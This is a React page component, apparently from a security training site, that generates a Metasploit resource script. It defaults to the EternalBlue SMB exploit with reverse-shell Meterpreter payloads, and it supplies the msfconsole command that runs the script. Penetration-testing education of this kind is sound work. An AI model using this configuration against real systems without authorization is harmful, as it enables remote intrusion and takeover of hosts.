'use client'
import { useState, useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

export default function MetasploitCommandBuilderPage() {
  const [rhost, setRhost] = useState('192.168.1.10');
  const [lhost, setLhost] = useState('10.0.0.1');
  const [lport, setLport] = useState('4444');
  const [payload, setPayload] = useState('windows/meterpreter/reverse_tcp');
  const [exploit, setExploit] = useState('exploit/windows/smb/ms17_010_eternalblue');
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const generatedScript = `${exploit}
set RHOSTS ${rhost}
set LHOST ${lhost}
set LPORT ${lport}
set PAYLOAD ${payload}
exploit`;

  const copyScript = () => {
    navigator.clipboard.writeText(generatedScript);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-amber/10 border border-cyber-amber/20 text-cyber-amber text-xs font-medium font-mono mb-4">
          <i className="ri-tools-line" />
          Metasploit Tool
        </div>
        <DocHeading level={1}>Command Builder</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Configure your exploit parameters and copy the generated msfconsole resource script.
        </p>
      </motion.div>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="cyber-card p-5 md:p-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div>
              <label className="text-sm font-semibold text-white block mb-2">Exploit Module</label>
              <input
                type="text"
                value={exploit}
                onChange={(e) => setExploit(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-amber"
                placeholder="exploit/windows/smb/ms17_010_eternalblue"
              />
            </div>
            <div>
              <label className="text-sm font-semibold text-white block mb-2">RHOSTS (Target)</label>
              <input
                type="text"
                value={rhost}
                onChange={(e) => setRhost(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-amber"
                placeholder="192.168.1.10"
              />
            </div>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div>
              <label className="text-sm font-semibold text-white block mb-2">LHOST (Your IP)</label>
              <input
                type="text"
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-amber"
                placeholder="10.0.0.1"
              />
            </div>
            <div>
              <label className="text-sm font-semibold text-white block mb-2">LPORT</label>
              <input
                type="text"
                value={lport}
                onChange={(e) => setLport(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-amber"
                placeholder="4444"
              />
            </div>
          </div>
          <div className="mb-5">
            <label className="text-sm font-semibold text-white block mb-2">Payload</label>
            <select
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text focus:outline-none focus:border-cyber-amber"
            >
              <option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option>
              <option value="windows/meterpreter/reverse_https">windows/meterpreter/reverse_https</option>
              <option value="windows/shell/reverse_tcp">windows/shell/reverse_tcp</option>
              <option value="linux/x64/meterpreter/reverse_tcp">linux/x64/meterpreter/reverse_tcp</option>
              <option value="linux/x86/shell/reverse_tcp">linux/x86/shell/reverse_tcp</option>
            </select>
          </div>
          <div className="bg-cyber-bg border border-cyber-border rounded-lg p-4">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-semibold text-cyber-amber">Resource Script</span>
              <button
                type="button"
                onClick={copyScript}
                className="text-xs text-cyber-cyan hover:text-cyber-cyan-dim transition-colors flex items-center gap-1"
              >
                <i className={copied ? 'ri-check-line' : 'ri-file-copy-line'} />
                {copied ? 'Copied!' : 'Copy'}
              </button>
            </div>
            <pre className="text-sm font-mono text-cyber-green whitespace-pre-wrap">{generatedScript}</pre>
          </div>
          <p className="text-xs text-cyber-text-dim mt-2">
            Save to a file and run with: <code className="text-cyber-cyan font-mono">msfconsole -r exploit.rc</code>
          </p>
        </div>
      </motion.section>

      <motion.section className="mt-12 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="mt-8 flex gap-3">
          <a href="/metasploit" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            <i className="ri-home-line mr-1" /> Back to Metasploit Module
          </a>
        </div>
      </motion.section>
    </div>
  );
}